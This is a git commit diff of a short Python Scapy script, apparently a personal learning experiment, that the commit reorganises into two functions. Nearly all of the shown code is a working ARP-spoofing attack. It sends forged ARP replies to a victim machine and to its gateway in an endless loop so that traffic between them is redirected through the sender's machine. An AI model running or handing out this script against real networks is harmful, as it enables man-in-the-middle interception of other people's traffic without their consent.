6ead40518fc0574b6431eb0f253525105c619fc6
mantvydas <mantvydo@gmail.com>
2016-03-02 23:04:45 +0000

    moved poison code to methods

--- scabby.py
+++ scabby.py
@@ -1,6 +1,6 @@
 from scapy.all import *
 
-TARGET_IP = "192.168.2.4"
+TARGET_IP = "192.168.2.6"
 GATEWAY_IP = "192.168.2.1"
 
 # Playing with an IP packet
@@ -15,30 +15,37 @@ b = TCP()
 print(b)
 
 
+
+
+
 #####  Playing with an ARP packet. Trying to poison a specified machine  #####
-poisonedTarget = ARP()
-
-# Simulate that this is a response packet (who-has(1) / is-at(2));
-poisonedTarget.op = 2
-
-# Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
-# The packet by default will have our mac address as a source. Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
-poisonedTarget.psrc = GATEWAY_IP
-
-# Victim's IP address that we want to poison;
-poisonedTarget.pdst = TARGET_IP
-
-# Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
-poisonedGateway = ARP()
-poisonedGateway.op = 2
-poisonedGateway.psrc = TARGET_IP
-poisonedGateway.pdst = GATEWAY_IP
-
-
-# Keep poisoning the ARP;
-while True:
-    print('Poisoning target ' + str(poisonedTarget.pdst))
-    send(poisonedTarget, verbose=False)
+def poisonGateway():
+    # Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
+    poisonedGateway = ARP()
+    poisonedGateway.op = 2
+    poisonedGateway.psrc = TARGET_IP
+    poisonedGateway.pdst = GATEWAY_IP
     print('Poisoning gateway ' + str(poisonedGateway.pdst))
     send(poisonedGateway, verbose=False)
+
+
+def poisonTarget():
+    poisonedTarget = ARP()
+
+    # Simulate that this is a response packet (who-has(1) / is-at(2));
+    poisonedTarget.op = 2
+
+    # Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
+    # The packet by default will have our mac address as a source. Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
+    poisonedTarget.psrc = GATEWAY_IP
+
+    # Victim's IP address that we want to poison;
+    poisonedTarget.pdst = TARGET_IP
+
+    print('Poisoning target ' + str(poisonedTarget.pdst))
+    send(poisonedTarget, verbose=False)
+
+while True:
+    poisonTarget()
+    poisonGateway()
     time.sleep(2)
